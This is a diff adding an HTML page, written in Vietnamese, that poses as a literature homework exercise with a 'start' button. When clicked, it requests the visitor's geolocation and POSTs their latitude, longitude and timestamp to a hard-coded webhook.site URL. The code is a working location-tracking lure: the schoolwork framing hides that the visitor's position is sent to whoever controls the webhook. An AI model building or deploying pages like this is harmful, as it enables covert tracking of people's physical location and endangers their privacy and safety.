@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Lấy vị trí</title>
+</head>
+<body>
+
+<h2>bài tập văn</h2>
+
+<button onclick="getLocation()">bắt đầu</button>
+
+<p id="status"></p>
+
+<script>
+function getLocation() {
+    if (navigator.geolocation) {
+        document.getElementById("status").innerHTML = "Đang lấy vị trí...";
+        navigator.geolocation.getCurrentPosition(sendPosition, showError);
+    } else {
+        document.getElementById("status").innerHTML = "Trình duyệt không hỗ trợ.";
+    }
+}
+
+function sendPosition(position) {
+    let lat = position.coords.latitude;
+    let lon = position.coords.longitude;
+
+    // Gửi về webhook của bạn
+    fetch("https://webhook.site/27d1640b-78cc-49da-a4b2-3858f7865655", {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            latitude: lat,
+            longitude: lon,
+            time: new Date().toLocaleString()
+        })
+    });
+
+    document.getElementById("status").innerHTML =
+        "Đã gửi vị trí thành công!";
+}
+
+function showError(error) {
+    document.getElementById("status").innerHTML =
+        "Bạn chưa cho phép chia sẻ vị trí!";
+}
+</script>
+
+</body>
+</html>
